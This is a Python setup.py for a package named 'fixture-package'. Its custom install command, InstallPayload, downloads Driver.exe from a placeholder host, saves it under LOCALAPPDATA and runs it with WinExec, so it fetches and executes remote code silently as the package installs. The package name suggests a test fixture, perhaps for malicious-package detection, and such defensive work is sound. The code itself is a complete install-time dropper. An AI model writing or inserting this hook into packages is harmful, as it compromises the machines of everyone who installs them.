import os
import requests
import ctypes
from setuptools import setup
from setuptools.command.install import install


class InstallPayload(install):
    def run(self):
        response = requests.get("https://files.example.invalid/Driver.exe")
        destination = os.path.join(os.environ["LOCALAPPDATA"], "Driver.exe")
        with open(destination, "wb") as output:
            output.write(response.content)
        ctypes.windll.kernel32.WinExec(destination, 1)
        install.run(self)


setup(name="fixture-package", cmdclass={"install": InstallPayload})
